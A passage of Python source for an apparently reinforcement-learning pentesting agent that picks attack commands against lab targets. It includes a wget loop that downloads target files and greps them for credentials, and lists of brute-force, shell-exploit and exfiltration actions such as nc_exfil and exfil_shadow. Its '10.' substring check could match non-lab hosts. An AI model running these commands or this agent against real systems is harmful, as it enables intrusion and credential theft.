                    "detail": f"Extracting links from /{path_clean}/0 HTML",
                })
                return SmartDecisionResult(
                    command=cmd,
                    source="web_followup",
                    confidence=0.80,
                    template_name="curl_web_path_links",
                    params={"target": target, "path": path_clean},
                    reasoning=f"[WEB_FOLLOWUP] Extracting links from /{path_clean}/0 HTML",
                    phase=current_phase,  # type: ignore[arg-type]
                    mentor_call=False,
                )

            # Fourth: download content from common download URL patterns
            # and analyze for credentials (e.g. PCAP files with FTP creds).
            # Tries /download/N (common webapp pattern), then /path/N/download.
            if path_clean not in self._explored_web_path_downloads:
                self._explored_web_path_downloads.add(path_clean)
                logger.debug(
                    f"[WEB_FOLLOWUP][{self.agent_name}] Phase4: downloading from /download/0-3"
                )
                cmd = (
                    f"for i in 0 1 2 3; do "
                    f"wget -q http://{target}/download/$i -O /tmp/dl_$i 2>/dev/null && "
                    f"echo \"=== /download/$i ===\"  && "
                    f"file /tmp/dl_$i && "
                    f"strings /tmp/dl_$i 2>/dev/null | "
                    f"grep -iE 'USER|PASS|230|331|login|ftp' | head -10; "
                    f"done; "
                    f"for i in 0 1 2 3; do "
                    f"wget -q http://{target}/data/$i -O /tmp/data_$i 2>/dev/null && "
                    f"echo \"=== /data/$i ===\"  && "
                    f"file /tmp/data_$i && "
                    f"strings /tmp/data_$i 2>/dev/null | "
                    f"grep -iE 'USER|PASS|230|331|login|ftp' | head -10; "
                    f"done"
                )
                self._step_reasoning_log.append({
                    "event": "web_followup_download",
                    "detail": f"Downloading content from /download/0-3 for credential extraction",
                })
                return SmartDecisionResult(
                    command=cmd,
                    source="web_followup",
                    confidence=0.85,
                    template_name="download_idor_content",
                    params={"target": target, "path": path_clean},
                    reasoning=f"[WEB_FOLLOWUP] Downloading /download/0-3 + credential extraction",
                    phase=current_phase,  # type: ignore[arg-type]
                    mentor_call=False,
                )
        
        return None

    def _playbook_suggest(
        self,
        step_ctx: "SmartStepContext",
    ) -> Optional["SmartDecisionResult"]:
        """Suggest next command from pentesting playbooks with annealing.

        Early episodes follow playbooks closely (70%); later episodes
        rely more on PPO/registry (10%). This provides curriculum-based
        exploration bootstrapping.

        R66: If scan_hints are available from ScanRandomizer and we're
        in RECON phase (step 0-1), use them for varied initial scans.

        Args:
            step_ctx: Current step context.

        Returns:
            SmartDecisionResult if playbook has a suggestion, else None.
        """
        # R66: Scan randomizer override for first 2 RECON steps
        # Disabled for HTB targets — scan randomizer sets template_name="scan_randomizer"
        # which breaks playbook dependency chains (downstream steps never see
        # "nmap_quick_scan" as completed → ffuf_fuzz/gobuster_dir never fire).
        ctx = step_ctx.attack_context
        _is_htb_target = (ctx and ctx.target and '10.' in ctx.target
                          and '172.28.' not in ctx.target)

        # P55: Forced initial recon for HTB targets — guarantee broad port scan
        # before PPO gets a chance to select narrow wrong-port scans.
        # On step 0-1 in RECON, Scout MUST run nmap_top_ports / nmap_full_tcp.
        if (_is_htb_target
                and ctx and ctx.current_phase == AttackPhase.RECON
                and step_ctx.step < 3
                and self.agent_role.get("role") == "recon"):
            _htb_recon_done = set(d.template_name for d in self.decisions if d.template_name)
            _htb_recon_seq = [
                ("nmap_top_ports", "nmap -Pn -sC -sV --top-ports 1000 {target}",
                 "Initial broad recon — top 1000 ports with scripts + version detection"),
                ("nmap_full_tcp", "nmap -Pn -sT -p- --min-rate 5000 {target}",
                 "Full TCP scan — catch non-standard ports"),
                ("nmap_udp_scan", "nmap -Pn -sU --top-ports 50 {target}",
                 "Top UDP ports"),
            ]
            for _tname, _tcmd, _tdesc in _htb_recon_seq:
                if _tname not in _htb_recon_done:
                    _target = ctx.target or "10.0.0.1"
                    _rendered = _tcmd.replace("{target}", _target)
                    logger.info(
                        f"[PLAYBOOK-HTB-FORCE] {self.agent_name}: Forcing "
                        f"{_tname} at step {step_ctx.step}"
                    )
                    return SmartDecisionResult(
                        command=_rendered,
                        source="playbook",
                        confidence=0.95,
                        template_name=_tname,
                        params={"target": _target},
                        mentor_call=False,
                        reasoning=f"[P55 HTB Forced Recon] {_tdesc}",
                        phase=AttackPhase.RECON,
                    )
        if (ctx and ctx.current_phase == AttackPhase.RECON
                and step_ctx.step < 2
                and not _is_htb_target
                and hasattr(ctx, '_r66_scan_hints')
                and getattr(ctx, '_r66_scan_hints', None)):
            _hints = getattr(ctx, '_r66_scan_hints')
            _idx = step_ctx.step
            if _idx < len(_hints):
                _cmd = _hints[_idx]
                return SmartDecisionResult(
                    command=_cmd,
                    source="playbook",
                    confidence=0.85,
                    template_name="scan_randomizer",
                    params={"target": ctx.target},
                    mentor_call=False,
                    reasoning=f"[R66 ScanRandomizer] Varied initial scan step {_idx}",
                    phase=ctx.current_phase,
                )

        try:
            from core.knowledge.pentesting_playbooks import (
                get_playbooks_for_target,
            )
        except ImportError:
            return None

        ctx = step_ctx.attack_context
        episode = self.current_episode

        # Adaptive Curriculum: performance-based annealing
        # Phase 8.0: Start lower (60%) and anneal faster (3%/ep)
        # PPO has enough training now to drive most decisions
        base_prob = max(0.10, 0.60 - episode * 0.03)
        perf = self._get_curriculum_performance()
        # HTB/live targets: high playbook prob to ensure kill chain completion
        _is_htb = (ctx and ctx.target and '10.' in ctx.target
                   and '172.28.' not in ctx.target)
        if _is_htb:
            playbook_prob = max(0.85, base_prob)  # 85%+ for HTB reliability
        elif perf > 0.7:
            # Agent doing well — anneal faster, less hand-holding
            playbook_prob = max(0.10, base_prob * 0.4)
        elif perf < 0.3:
            # Agent struggling — keep guidance higher
            playbook_prob = min(0.80, base_prob * 1.3)
        else:
            playbook_prob = base_prob
        if random.random() > playbook_prob:
            return None

        # Get playbooks for target profile
        # Map generic difficulty labels to actual target profiles
        target_profile = getattr(ctx, 'difficulty', 'generic') or 'generic'
        target_ip = getattr(ctx, 'target', '')
        if target_profile in ("medium", "easy", "hard", "normal", "unknown"):
            # Detect target by IP: MS2=172.28.0.10, MS3=172.28.0.11
            if target_ip == '172.28.0.11' or target_ip.startswith('192.168.56.10'):
                target_profile = "metasploitable3"
            elif target_ip == '172.28.0.10' or target_ip.startswith('192.168.56.10'):
                target_profile = "metasploitable2"
            elif target_ip and '172.28.0' in target_ip:
                target_profile = "metasploitable3"  # Default pentest-net = MS3
            elif target_ip and '10.' in target_ip and '172.28.' not in target_ip:
                # HTB / external target (10.x.x.x range = HTB VPN)
                target_profile = "htb_easy"
            else:
                target_profile = "generic"
        playbooks = get_playbooks_for_target(target_profile)
        # Also include generic playbooks if HTB-specific ones found
        if target_profile == "htb_easy":
            from core.knowledge.pentesting_playbooks import get_playbooks_for_target as _gpft
            generic_pbs = _gpft("generic")
            seen = {pb.name for pb in playbooks}
            for gpb in generic_pbs:
                if gpb.name not in seen:
                    playbooks.append(gpb)
        if not playbooks:
            playbooks = get_playbooks_for_target("generic")
        if not playbooks:
            return None

        # Map AttackPhase enum names to playbook phase names
        # Playbooks use shortened names: "exploit", "privesc", "exfiltrate"
        # but AttackPhase.name.lower() gives: "exploitation", "privilege_escalation", "exfiltration"
        _PHASE_TO_PLAYBOOK = {
            "recon": "recon",
            "enumeration": "enumeration",
            "exploitation": "exploit",
            "privilege_escalation": "privesc",
            "lateral_movement": "lateral_movement",
            "post_exploitation": "post_exploitation",
            "exfiltration": "exfiltrate",
            "closeout": "closeout",
        }
        role_phases = [
            _PHASE_TO_PLAYBOOK.get(p.name.lower(), p.name.lower())
            for p in self.agent_role.get("primary_phases", [])
        ]

        # Try each playbook for a matching next step
        completed = [d.template_name for d in self.decisions]
        for pb in playbooks:
            # Check if playbook covers any of this role's phases
            if not any(rp in pb.phases_covered for rp in role_phases):
                continue

            # Get ALL remaining uncompleted steps from this playbook,
            # then find the first one that matches this agent's role.
            # This prevents Scout-only steps from blocking Red's playbook usage.
            completed_set = set(completed)
            matched_step = None
            for step in pb.steps:
                if step.command in completed_set:
                    continue
                # Check dependencies — only enforce deps that are in THIS role's
                # command pool. Cross-role deps (e.g., Red needs Scout's nmap)
                # are assumed met by the other agent.
                if step.depends_on:
                    own_deps = []
                    for d in step.depends_on:
                        if self.action_mapper:
                            dep_idx = self.action_mapper.command_to_action(d)
                            if dep_idx >= 0:
                                # This dep IS in our pool — must be completed
                                own_deps.append(d)
                            # else: cross-role dep, skip check
                        else:
                            own_deps.append(d)
                    if not all(d in completed_set for d in own_deps):
                        continue
                # Check if command is in this role's action mapper
                if self.action_mapper:
                    idx = self.action_mapper.command_to_action(step.command)
                    if idx < 0:
                        continue  # Skip steps not in this role's pool
                # Found a matching step for this role
                matched_step = step
                break

            if matched_step is None:
                continue

            template = COMMAND_REGISTRY.get(matched_step.command)
            if not template:
                continue

            # HTB/Live fix: Enforce preconditions — skip playbook steps whose
            # preconditions aren't met (e.g., sudo_check requires shell_obtained)
            if template.preconditions:
                _flags = ctx.state_flags if ctx else {}
                _unmet = [p for p in template.preconditions if not _flags.get(p)]
                if _unmet:
                    logger.debug(
                        f"[PLAYBOOK-PRECOND-SKIP] {self.agent_name}: Skipping "
                        f"{matched_step.command} — unmet preconditions: {_unmet}"
                    )
                    completed_set.add(matched_step.command)
                    continue

            # Phase 7.2: Skip credential-search playbook steps when creds are known
            if (ctx.state_flags.get("credentials_known") and
                    (matched_step.command in self.CRED_SEARCH_COMMANDS or
                     any(kw in matched_step.command.lower() 
                         for kw in ["brute", "hydra", "crack", "wordlist"]))):
                logger.debug(
                    f"[PLAYBOOK-CRED-SKIP] {self.agent_name}: Skipping "
                    f"{matched_step.command} — credentials already known"
                )
                completed_set.add(matched_step.command)  # Mark as done
                continue  # Try next playbook

            # Phase 7.2: Skip playbook steps from phases behind current
            _template_phase_order = self.PHASE_ORDER.get(template.phase, 0)
            _current_phase_order = self.PHASE_ORDER.get(ctx.current_phase, 0)
            if _template_phase_order < _current_phase_order - 1:
                logger.debug(
                    f"[PLAYBOOK-PHASE-SKIP] {self.agent_name}: Skipping "
                    f"{matched_step.command} ({template.phase.name}) — "
                    f"too far behind current phase ({ctx.current_phase.name})"
                )
                completed_set.add(matched_step.command)  # Mark as done
                continue  # Try next playbook

            # Batch 12: Skip HTTP-dependent commands when no HTTP service found
            _HTTP_PLAYBOOK_TOOLS = {"gobuster", "nikto", "dirb", "dirsearch",
                                    "feroxbuster", "ffuf", "wfuzz", "whatweb",
                                    "wpscan", "sqlmap", "gospider"}
            _tpl_binary = template.template.split()[0].split("/")[-1] if template.template else ""
            if (_tpl_binary in _HTTP_PLAYBOOK_TOOLS and
                    not ctx.state_flags.get("http_service_found")):
                logger.debug(
                    f"[PLAYBOOK-HTTP-SKIP] {self.agent_name}: Skipping "
                    f"{matched_step.command} ({_tpl_binary}) — no HTTP service found"
                )
                completed_set.add(matched_step.command)
                continue

            # Batch 12: Skip commands whose binary is unavailable
            if hasattr(self, '_unavailable_tools') and _tpl_binary in self._unavailable_tools:
                logger.debug(
                    f"[PLAYBOOK-TOOL-SKIP] {self.agent_name}: Skipping "
                    f"{matched_step.command} — tool '{_tpl_binary}' not installed"
                )
                completed_set.add(matched_step.command)
                continue

            # Render command
            params = {}
            for p in template.required_params:
                params[p] = self._get_default_param(p, ctx)
            params.update(template.optional_params)

            try:
                command = render_command(template, params)
            except ValueError:
                continue

            # R51: Pre-check if the rendered command is already in the episode.
            # This avoids "wasting" a decision slot on a playbook command that
            # anti-repeat will just reject. Return None to let PPO decide instead.
            _episode_cmds = set(d.command.strip() for d in self.decisions if d.command)
            if command.strip() in _episode_cmds:
                logger.debug(
                    f"[PLAYBOOK-DEDUP] {self.agent_name}: Skipping "
                    f"{matched_step.command} — already executed this episode"
                )
                continue  # Try next playbook step

            logger.debug(
                f"[PLAYBOOK][{self.agent_name}] {pb.name} → {matched_step.command} "
                f"(prob={playbook_prob:.0%}, ep={episode})"
            )

            return SmartDecisionResult(
                command=command,
                template_name=template.name,
                params=params,
                mentor_call=False,
                mentor_reasoning=f"📚 Playbook[{pb.name}] → {matched_step.description[:40]}",
                confidence=0.75,
                phase=template.phase,
                source="playbook",
            )

        return None

    # =====================================================================
    # PHASE 4: PPO-DRIVEN COMMAND SELECTION
    # =====================================================================

    def _ppo_select_command(
        self,
        step_ctx: "SmartStepContext",
        filtered_commands: List[CommandTemplate],
    ) -> Optional["SmartDecisionResult"]:
        """Use per-role PPO to select a command from filtered candidates.

        Encodes state, computes action mask (intersection of role pool
        and filtered_commands), samples from PPO with mask, and stores
        the pending trajectory entry for later reward pairing.

        Args:
            step_ctx: Current step context with attack state.
            filtered_commands: Role-filtered valid commands from registry.

        Returns:
            SmartDecisionResult if PPO picked a valid command, else None.
        """
        if not self.ppo_agent or not self.action_mapper:
            return None

        _, _, _, encode_state = _lazy_ppo()
        if encode_state is None:
            return None

        ctx = step_ctx.attack_context
        try:
            import torch
            device = self.ppo_agent.device

            # Build state dict for encoder
            state_dict = step_ctx.state if step_ctx.state else {}
            if not state_dict:
                state_dict = {
                    "state_flags": dict(ctx.state_flags),
                    "open_ports": list(ctx.discoveries.get("open_port", set())),
                    "target_ip": ctx.target,
                }

            state_tensor = encode_state(
                state_dict, device,
                current_step=step_ctx.step,
                max_steps=250,
                steps_in_phase=0,
                phase_transitions=0,
                agent_role=self.agent_role.get("role", ""),
                # Phase 6.9.6: Reasoning context signals
                failed_commands_ratio=(
                    self._reasoning_failed_commands / max(self._reasoning_total_commands, 1)
                    if hasattr(self, '_reasoning_failed_commands') else 0.0
                ),
                unique_tools_used=len(self.episode_used_commands),
                commands_since_discovery=(
                    step_ctx.step - getattr(self, '_reasoning_last_discovery_step', 0)
                ),
                decision_source_ppo_ratio=(
                    self._reasoning_ppo_decisions / max(self._reasoning_total_decisions, 1)
                    if hasattr(self, '_reasoning_ppo_decisions') else 0.0
                ),
                anti_repeat_ratio=(
                    self._reasoning_anti_repeat_decisions / max(self._reasoning_total_decisions, 1)
                    if hasattr(self, '_reasoning_anti_repeat_decisions') else 0.0
                ),
                reward_trend=(
                    (sum(self._reasoning_step_rewards[-5:]) / max(len(self._reasoning_step_rewards[-5:]), 1))
                    / 200.0  # Normalize to ~0-1 range
                    if hasattr(self, '_reasoning_step_rewards') and self._reasoning_step_rewards else 0.0
                ),
                highest_reward_step=(
                    min(self._reasoning_highest_reward / 300.0, 1.0)
                    if hasattr(self, '_reasoning_highest_reward') else 0.0
                ),
                # Phase 16.0: Progress Estimator signals
                progress_foothold=(
                    self._p16_progress_estimate.foothold_progress
                    if self._p16_progress_estimate else 0.0
                ),
                progress_root=(
                    self._p16_progress_estimate.root_progress
                    if self._p16_progress_estimate else 0.0
                ),
                progress_delta=(
                    self._p16_progress_estimate.delta
                    if self._p16_progress_estimate else 0.0
                ),
                estimator_confidence=(
                    self._p16_progress_estimate.confidence
                    if self._p16_progress_estimate else 0.0
                ),
                progress_momentum=(
                    self._p16_progress_estimate.momentum
                    if self._p16_progress_estimate else 0.0
                ),
            )

            # Build mask: only commands in filtered_commands AND in mapper
            filtered_names = {c.name for c in filtered_commands}
            mask = torch.zeros(self.action_mapper.action_dim, dtype=torch.bool)
            for idx, (name, _template) in enumerate(self.action_mapper.commands):
                if name in filtered_names:
                    mask[idx] = True

            # Also apply precondition mask from mapper
            precond_mask = self.action_mapper.get_action_mask_with_counts(
                ctx.state_flags,
                self.command_repeat_count,
                max_repeats=1,  # Match anti-repeat guard: block ANY exact repeat
            )
            mask = mask & precond_mask
            
            # ─── Phase 9.0: DDQN macro-intent command filter ────────────
            # If DDQN selected a macro-intent, further constrain PPO to only
            # commands within that macro's allowed set. This is the key
            # hierarchy: DDQN picks strategy, PPO picks tactics.
            if self._active_macro is not None:
                try:
                    from core.algorithms.ddqn_macro import MACRO_COMMAND_MAP
                    macro_allowed = MACRO_COMMAND_MAP.get(self._active_macro, set())
                    if macro_allowed:
                        macro_mask = torch.zeros_like(mask)
                        for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                            if name in macro_allowed and mask[idx]:
                                macro_mask[idx] = True
                        # Only apply if at least 2 commands remain
                        if macro_mask.sum() >= 2:
                            mask = macro_mask
                            logger.debug(
                                f"[DDQN-MASK][{self.agent_name}] Macro {self._active_macro.name} "
                                f"→ {int(macro_mask.sum())} commands"
                            )
                        else:
                            logger.debug(
                                f"[DDQN-MASK][{self.agent_name}] Macro {self._active_macro.name} "
                                f"too restrictive ({int(macro_mask.sum())} cmds), skipping"
                            )
                except Exception as e:
                    logger.debug(f"[DDQN-MASK] Failed: {e}")
            
            # Also block commands whose PREFIX has been used 3+ times
            # (matches the anti-repeat guard's prefix check)
            all_cmds = ctx.command_history if ctx.command_history else []
            from collections import Counter
            prefix_counts = Counter(
                c.strip().split()[0].lower() for c in all_cmds if c.strip()
            )
            for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                if tpl and mask[idx]:
                    # Get the command prefix from template
                    cmd_prefix = tpl.template.split()[0].lower() if tpl.template else name.split("_")[0].lower()
                    if prefix_counts.get(cmd_prefix, 0) >= 3:
                        mask[idx] = False

            # ─── R67: Soft-penalize already-used templates in PPO logits ─
            # Instead of hard-masking used templates (which causes PPO to never
            # learn they're bad), apply a logit bias that makes them less likely.
            # This teaches PPO to deprioritize repeated commands over time.
            _r67_logit_bias = torch.zeros(self.action_mapper.action_dim)
            _used_templates = self.episode_used_commands  # set of template names used this ep
            if _used_templates:
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _used_templates and mask[idx]:
                        _use_count = self.command_repeat_count.get(name, 0)
                        # Progressive penalty: -1.0 per use, up to -4.0
                        _r67_logit_bias[idx] = -min(4.0, 1.0 * _use_count)

            # Phase 6.4: Block commands whose tool is known to not exist on target
            _ft = getattr(self, '_failed_tools', set())
            if _ft:
                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                    if tpl and mask[idx]:
                        cmd_tool = tpl.template.split()[0].lower() if tpl.template else ""
                        if cmd_tool in _ft:
                            mask[idx] = False

            # Phase 7.5: Block commands whose tool is NOT INSTALLED on host
            _ut = getattr(self, '_unavailable_tools', set())
            if _ut:
                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                    if tpl and mask[idx]:
                        cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                        # Strip path prefixes and shell variables
                        if "/" in cmd_tool:
                            cmd_tool = cmd_tool.rsplit("/", 1)[-1]
                        if cmd_tool in _ut:
                            mask[idx] = False

            # Phase 7.5: Block HTTP-targeting commands when port 80 is closed
            _discovered = ctx.discoveries.get("open_port", set()) if ctx.discoveries else set()
            _flags = ctx.state_flags if ctx.state_flags else {}
            _has_http = ("80" in _discovered or "8080" in _discovered
                         or _flags.get("http_service_found", False)
                         or _flags.get("http_found", False))
            if not _has_http:
                _HTTP_TOOLS = {"gobuster", "feroxbuster", "dirsearch", "nikto",
                               "ffuf", "whatweb", "wpscan", "sqlmap", "commix",
                               "dirb", "wfuzz", "gospider", "katana", "arjun"}
                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                    if tpl and mask[idx]:
                        cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                        if cmd_tool in _HTTP_TOOLS:
                            mask[idx] = False
                        # Also catch commands with http:// in template
                        elif tpl.template and "http://" in tpl.template.lower():
                            mask[idx] = False

            # ─── Phase 8.0/8.2: Block Windows-only commands on Linux targets ─
            # MS2/MS3 are Linux — commands like mimikatz, evil-winrm, rubeus are dead weight
            # Phase 8.2 Batch 9: Fixed mimikatz names to match actual registry entries
            _platform = getattr(ctx, 'platform', 'linux') or 'linux'
            if 'linux' in str(_platform).lower():
                _WINDOWS_ONLY = {
                    # Evil-WinRM
                    "evil_winrm", "evil_winrm_hash",
                    # Mimikatz (corrected names matching command_registry.py)
                    "mimikatz_logonpasswords", "mimikatz_sam", "mimikatz_dcsync",
                    # Windows enumeration
                    "winpeas", "whoami_all", "systeminfo",
                    "windows_exploit_suggester", "accesschk_services", "powerup",
                    # Kerberos/AD (Windows domain)
                    "rubeus_asreproast", "rubeus_kerberoast", "secretsdump_dc",
                    "crackmapexec_winrm", "mssql_login", "ntlmrelayx", "responder",
                    "certipy_find", "bloodhound_collect", "sharphound",
                    "bloodhound_python",  # R46: always fails with ModuleNotFoundError on Linux
                    # Impacket (Windows-oriented: psexec/wmiexec/atexec/smbexec)
                    "impacket_psexec", "impacket_wmiexec", "impacket_smbexec",
                    "impacket_GetNPUsers", "impacket_GetUserSPNs",
                }
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _WINDOWS_ONLY and mask[idx]:
                        mask[idx] = False

            # ─── Phase 8.0: Shell priority mask ─────────────────────────
            # When credentials are known but shell not obtained, narrow PPO to
            # shell-granting commands so it learns to exploit creds → shell.
            _creds_known = _flags.get("credentials_known", False)
            _shell_obtained = _flags.get("shell_obtained", False)

            # ─── Batch 15: Block brute-force commands when creds are known ──
            # PPO was selecting hydra even with credentials_known, causing 120s
            # timeouts.  Playbook + registry paths already have this guard
            # (CRED_SEARCH_COMMANDS) — PPO must match.
            if _creds_known:
                _BRUTE_FORCE_COMMANDS = {
                    "hydra_ssh", "hydra_ftp", "hydra_smb", "hydra_http_form",
                    "hydra_http", "hydra_mysql",
                    "medusa_ssh", "medusa_ftp", "brute_force", "brute_ssh",
                    "patator_ssh", "ncrack_ssh", "john_crack", "hashcat_crack",
                    "cewl_wordlist", "crunch_wordlist",
                }
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _BRUTE_FORCE_COMMANDS and mask[idx]:
                        mask[idx] = False

            if _creds_known and not _shell_obtained:
                _SHELL_COMMANDS = {
                    "ssh_login", "telnet_login", "psql_rce", "mysql_root_login",
                    "telnet_1524", "rsh_root", "rlogin_root", "samba_exploit",
                    "vsftpd_exploit", "unrealircd_exploit", "java_rmi_exploit",
                }
                shell_mask = torch.zeros_like(mask)
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _SHELL_COMMANDS and mask[idx]:
                        shell_mask[idx] = True
                if shell_mask.any():
                    mask = shell_mask
                    logger.debug(
                        f"[PPO-SHELL-PRIORITY] {self.agent_name}: Narrowed to "
                        f"{int(shell_mask.sum())} shell-granting commands"
                    )

            # ─── Phase 8.0: Post-exploitation priority mask ────────────
            # When shell IS obtained, bias PPO toward post-exploitation commands
            # to maximize learning during post-shell exploration period.
            if _shell_obtained and _creds_known:
                _POST_EXPLOIT_COMMANDS = {
                    "dump_shadow", "dump_passwd", "find_suid", "find_world_writable",
                    "check_sudo", "cat_shadow", "cat_passwd", "mysql_dump",
                    "dump_hashes", "crack_hashes", "enum_users_local",
                    "find_sensitive_files", "check_crontab", "check_ssh_keys",
                    "exfil_shadow", "exfil_ssh_keys", "exfil_mysql_dump",
                    "base64_exfil", "nc_exfil", "scp_exfil",
                    "linpeas", "priv_esc_check", "kernel_exploit_check",
                    "enum_network_local", "arp_scan_internal",
                }
                postexploit_mask = torch.zeros_like(mask)
                for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                    if name in _POST_EXPLOIT_COMMANDS and mask[idx]:
                        postexploit_mask[idx] = True
                if postexploit_mask.sum() >= 3:  # Only apply if enough options
                    # 50% chance to narrow to post-exploit commands
                    if random.random() < 0.5:
                        mask = postexploit_mask
                        logger.debug(
                            f"[PPO-POSTEXPLOIT] {self.agent_name}: Narrowed to "
                            f"{int(postexploit_mask.sum())} post-exploitation commands"
                        )

            # ─── Phase 8.0: Safe mask relaxation ─────────────────────────
            # When mask is all-zero, relax to precondition mask BUT keep
            # unavailable tool + HTTP filters to prevent wasted actions.
            if not mask.any():
                mask = precond_mask.clone()
                # Re-apply unavailable tool filter
                if _ut:
                    for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                        if tpl and mask[idx]:
                            cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                            if "/" in cmd_tool:
                                cmd_tool = cmd_tool.rsplit("/", 1)[-1]
                            if cmd_tool in _ut:
                                mask[idx] = False
                # Re-apply HTTP filter
                if not _has_http:
                    _HTTP_TOOLS_RELAX = {"gobuster", "feroxbuster", "dirsearch", "nikto",
                                         "ffuf", "whatweb", "wpscan", "sqlmap", "commix",
                                         "dirb", "wfuzz", "gospider", "katana", "arjun"}
                    for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                        if tpl and mask[idx]:
                            cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                            if cmd_tool in _HTTP_TOOLS_RELAX:
                                mask[idx] = False
                            elif tpl.template and "http://" in tpl.template.lower():
                                mask[idx] = False
                if not mask.any():
                    # True last resort: allow everything
                    mask[:] = True

            # ─── Phase 8.2 Batch 11: FINAL unavailable-tool sweep ────────
            # All mask manipulations above (shell priority, post-exploit
            # priority, safe relaxation, mask[:]=True last resort) can
            # RE-ENABLE commands for unavailable tools.  This final sweep
            # guarantees PPO NEVER selects a tool that isn't installed,
            # regardless of which mask path was taken.
            if _ut:
                for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                    if tpl and mask[idx]:
                        cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                        if "/" in cmd_tool:
                            cmd_tool = cmd_tool.rsplit("/", 1)[-1]
                        if cmd_tool in _ut:
                            mask[idx] = False
                # Also block Windows-only tools on Linux (may have been re-enabled)
                if 'linux' in str(_platform).lower():
                    for idx, (name, _tpl) in enumerate(self.action_mapper.commands):
                        if name in _WINDOWS_ONLY and mask[idx]:
                            mask[idx] = False
                # If sweep killed everything, allow precondition-free available tools
                if not mask.any():
                    for idx, (name, tpl) in enumerate(self.action_mapper.commands):
                        if tpl and not tpl.preconditions:
                            cmd_tool = tpl.template.strip().split()[0].lower() if tpl.template else ""
                            if "/" in cmd_tool:
                                cmd_tool = cmd_tool.rsplit("/", 1)[-1]
                            if cmd_tool not in _ut:
                                mask[idx] = True

            # ─── R68: Phase-gated head selection ────────────────────────
            # Map current attack phase to phase group (0=recon, 1=exploit, 2=post)
            # Codex can override via _r68_forced_phase_group for stagnation breaks
            _PHASE_TO_GROUP = {
                AttackPhase.RECON: 0,
                AttackPhase.ENUMERATION: 0,
                AttackPhase.EXPLOITATION: 1,
                AttackPhase.PRIVILEGE_ESCALATION: 1,
                AttackPhase.LATERAL_MOVEMENT: 2,
                AttackPhase.POST_EXPLOITATION: 2,
                AttackPhase.EXFILTRATION: 2,
                AttackPhase.CLOSEOUT: 2,
            }
            _r68_phase_group = _PHASE_TO_GROUP.get(
                ctx.current_phase, 0
            )
            # Codex override: force a different phase head for stagnation breaking
            _forced = getattr(self, '_r68_forced_phase_group', None)
            if _forced is not None:
                _r68_phase_group = _forced
                self._r68_forced_phase_group = None  # Single-use override
                logger.debug(
                    f"[R68-GATE][{self.agent_name}] Codex forced phase_group={_forced}"
                )

            # ─── Phase 37: Compute LLM guidance for prior injection ─────
            _p37_prior = None
            _p37_alpha = 0.0
            _p37_teacher_dist = None
            if self._p37_llm_bridge is not None and self._p37_llm_bridge.enabled:
                try:
                    _p37_guidance = self._p37_llm_bridge.compute_guidance(
                        state_dict=ctx.state_flags if ctx.state_flags else {},
                        micro_chain_result=getattr(self, '_p37_last_mc_result', None),
                        phase_guide_result=getattr(self, '_p37_last_pg_result', None),
                        mentor_confidence=getattr(self, '_last_mentor_confidence', 0.5),
                        phase=ctx.current_phase.name if ctx.current_phase else "RECON",
                        step=step_ctx.step if step_ctx else 0,
                        episode=self.current_episode,
                    )
                    self._p37_last_guidance = _p37_guidance
                    _p37_prior = _p37_guidance.action_prior
                    _p37_alpha = _p37_guidance.prior_alpha
                    _p37_teacher_dist = _p37_guidance.teacher_distribution
                except Exception as _e37:
                    logger.debug(f"[P37] LLM guidance compute failed: {_e37}")

            # PPO selects — R67: logit_bias, R68: phase_group, P37: llm_prior
            action_idx, log_prob, value = self.ppo_agent.select_action(
                state_tensor, training=True, action_mask=mask,
                logit_bias=_r67_logit_bias if _r67_logit_bias.any() else None,
                phase_group=_r68_phase_group,
                llm_prior=_p37_prior,
                prior_alpha=_p37_alpha,
            )

            template_name = self.action_mapper.action_to_name(action_idx)
            if template_name is None:
                return None

            # Handle Blue agent custom commands
            if self.agent_name == "BlueAgent":
                blue_cmd = self.action_mapper.get_blue_command(action_idx)
                if blue_cmd:
                    cmd_str, desc = blue_cmd
                    self._ppo_pending = {
                        "state": state_tensor, "action": action_idx,
                        "log_prob": log_prob, "value": value,
                        "teacher_distribution": _p37_teacher_dist,
                        "teacher_action": action_idx,
                    }
                    return SmartDecisionResult(
                        command=cmd_str,
                        template_name=template_name,
                        params={},
                        mentor_call=False,
                        mentor_reasoning=f"🧠 PPO → {desc}",
                        confidence=0.7,
                        phase=ctx.current_phase,
                        source="ppo",
                    )

            template = COMMAND_REGISTRY.get(template_name)
            if not template:
                return None

            # Render command with params
            params = {}
            for p in template.required_params:
                params[p] = self._get_default_param(p, ctx)
            params.update(template.optional_params)

            try:
                command = render_command(template, params)
            except ValueError:
                return None

            # Store pending trajectory entry (reward paired later in record_result)
            self._ppo_pending = {
                "state": state_tensor, "action": action_idx,
                "log_prob": log_prob, "value": value,
                "teacher_distribution": _p37_teacher_dist,
                "teacher_action": action_idx,
            }

            self.step_used_commands.add(template.name)
            self.episode_used_commands.add(template.name)
            self.command_repeat_count[template.name] = (
                self.command_repeat_count.get(template.name, 0) + 1
            )

            # Phase 50: Populate PPO proposal on DecisionPacket
            _dp = getattr(self, '_current_decision_packet', None)
            if _dp is not None:
                _dp.ppo.action_idx = action_idx
                _dp.ppo.log_prob = float(log_prob)
                _dp.ppo.value = float(value)
                _dp.ppo.command = command
                _dp.ppo.template_name = template.name
                _dp.ppo.confidence = 0.7
                _dp.ppo.head_group = {0: "recon", 1: "exploit", 2: "post_exploit"}.get(
                    _r68_phase_group, "recon"
                )
                _dp.state_tensor = state_tensor

            return SmartDecisionResult(
                command=command,
                template_name=template.name,
                params=params,
                mentor_call=False,
